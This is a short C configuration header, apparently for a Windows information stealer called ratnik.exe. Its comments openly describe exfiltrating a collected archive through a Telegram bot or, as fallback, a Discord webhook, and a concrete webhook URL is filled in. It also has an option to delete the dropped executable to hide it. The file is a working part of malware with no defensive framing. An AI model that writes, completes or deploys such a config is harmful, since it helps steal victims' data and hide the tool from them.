// config.h — edit before build
#pragma once

// Telegram exfiltration (preferred). Leave empty to disable sending.
#define TG_BOT_TOKEN  ""
#define TG_CHAT_ID    ""

// Discord/generic webhook, used if TG is empty. Leave empty to disable.
#define WEBHOOK_URL   "https://discord.com/api/webhooks/1574831705137618984/MSqmL1FUU155PHSwiT2Ol4ZRGuaD2ik2CAL4hgF-th-aC30ddM7lf7QUgrawDAoqnt9e"

// Delete ratnik.exe after a successful run (hides the dropped file).
#define SELF_DELETE   0

// If both exfil targets are empty the archive is only written to %TEMP%
// (or %RATNIK_OUT% if set) and nothing is sent.
